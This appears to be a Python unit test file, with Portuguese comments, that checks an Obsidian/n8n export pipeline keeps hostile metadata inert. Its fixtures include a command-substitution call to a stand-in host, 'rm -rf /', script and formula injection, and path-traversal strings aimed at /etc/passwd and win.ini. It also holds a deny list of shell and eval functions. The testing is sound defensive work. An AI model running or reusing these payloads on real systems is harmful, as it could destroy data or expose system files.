"""Missão Suprema 03, Etapa 15: exportação (staging do Obsidian, contratos n8n) com metadados hostis.

Transcrição, legenda e metadados são dados não confiáveis: nunca viram comando, caminho, frontmatter,
HTML, wikilink ou fórmula.
"""
import ast
import tempfile
import unittest
from pathlib import Path

from tests import _helpers  # noqa: F401
from ii_mm import adapters as A
from ii_mm.classifier import Classifier
import json

from ii_mm.n8n_contract import compute_mission_id, validate_mission
from ii_mm.normalize import Normalizer
from ii_mm.obsidian_export import export_reference
from ii_mm.synthetic import sha

ROOT = Path(__file__).resolve().parents[1]
EVIL = ("tutorial\n---\nii_platform: hack\n--- <script>alert(1)</script> [[Senhas]] ![x](https://evil.example/p.png) "
        "`rm -rf /` $(curl evil.example) <!-- ii:curadoria:fim --> =HYPERLINK(\"https://evil.example\")")


class NoCommandExecutionTest(unittest.TestCase):
    def test_core_never_executes_or_deserializes_code(self):
        """Nenhum caminho do núcleo entrega texto externo a um interpretador ou ao shell."""
        forbidden_modules = {"subprocess", "pickle", "marshal", "shelve", "pty"}
        forbidden_builtins = {"eval", "exec", "compile", "__import__"}
        forbidden_os = {"system", "popen", "spawnl", "spawnv", "spawnve", "execv", "execve", "startfile"}
        found = []
        for f in (ROOT / "ii_mm").rglob("*.py"):
            tree = ast.parse(f.read_text(encoding="utf-8"))
            for node in ast.walk(tree):
                if isinstance(node, ast.Import):
                    found += [f"{f.name}: import {a.name}" for a in node.names if a.name.split(".")[0] in forbidden_modules]
                elif isinstance(node, ast.ImportFrom) and (node.module or "").split(".")[0] in forbidden_modules:
                    found.append(f"{f.name}: from {node.module}")
                elif isinstance(node, ast.Call):
                    fn = node.func
                    if isinstance(fn, ast.Name) and fn.id in forbidden_builtins:  # re.compile é outra coisa
                        found.append(f"{f.name}:{node.lineno}: {fn.id}()")
                    elif isinstance(fn, ast.Attribute) and fn.attr in forbidden_os and getattr(fn.value, "id", "") == "os":
                        found.append(f"{f.name}:{node.lineno}: os.{fn.attr}()")
        self.assertEqual(found, [])


class HostileExportTest(unittest.TestCase):
    def setUp(self):
        n = Normalizer("ref/../../CON", "instagram", "SYNTHevil:ads", 30.0, content_sha256=sha("evil"),
                       origin_url="https://www.instagram.com/reel/SYNTHevil/", author_handle="../../etc\n---\nii_platform: x")
        n.add_transcript(A.transcript_from_segments([{"start": 0, "end": 3, "text": EVIL}]))
        self.doc = Classifier().classify(n.build())
        self.tmp = tempfile.TemporaryDirectory()
        self.addCleanup(self.tmp.cleanup)
        self.root = Path(self.tmp.name)

    def test_files_stay_inside_staging_with_safe_names(self):
        export_reference(self.doc, self.root / "staging")
        files = sorted(p.relative_to(self.root).as_posix() for p in self.root.rglob("*"))
        self.assertEqual(len(files), 3, files)  # a pasta e as duas notas, nada além
        for rel in files[1:]:
            name = rel.split("/", 1)[1]
            self.assertTrue(rel.startswith("staging/") and "/" not in name and ":" not in name, rel)
            self.assertFalse(name.upper().startswith("CON."), rel)

    def test_frontmatter_has_only_generated_keys(self):
        md = Path(export_reference(self.doc, self.root / "staging")["path"]).read_text(encoding="utf-8")
        lines = md.split("\n")
        self.assertEqual(lines[0], "---")
        end = lines.index("---", 1)
        keys = [line.split(":", 1)[0] for line in lines[1:end]]
        self.assertEqual(keys, ["ii_reference_id", "ii_platform", "ii_schema", "ii_analysis_hash", "ii_categories", "ii_tools"])
        self.assertIn("ii_platform: instagram", lines[1:end])

    def test_external_text_is_inert(self):
        md = Path(export_reference(self.doc, self.root / "staging")["path"]).read_text(encoding="utf-8")
        for active in ("<script", "[[Senhas]]", "![x](", "`rm -rf /`", "<!-- ii:curadoria:fim --> =HYPERLINK"):
            self.assertNotIn(active, md)
        self.assertEqual(md.count("<!-- ii:curadoria:fim -->"), 1)  # o texto externo não fecha o bloco do curador
        self.assertIn("$(curl evil.example)", md)  # preservado como texto: nada no núcleo o executa

    def test_mission_uris_from_metadata_cannot_escape_the_artifact_area(self):
        base = json.loads((ROOT / "fixtures" / "n8n_mission_example.json").read_text(encoding="utf-8"))
        self.assertEqual(validate_mission(base), [])
        for uri in ("../../etc/passwd", "file:///C:/Windows/win.ini", "C:/Windows/win.ini", "missions/x/video.mp4:oculto",
                    "missions/x/CON", "missions/x/nota.", "\\\\servidor\\c$\\x", "/etc/passwd", "missions/x/a\nb"):
            mission = json.loads(json.dumps(base))
            mission["artifacts"][0]["uri"] = uri
            mission["mission_id"] = compute_mission_id(mission)   # só a URI muda: o erro tem de ser dela
            errors = validate_mission(mission)
            self.assertTrue(errors and all(e.startswith("artifacts[0]") for e in errors), (uri, errors))

if __name__ == "__main__":
    unittest.main()
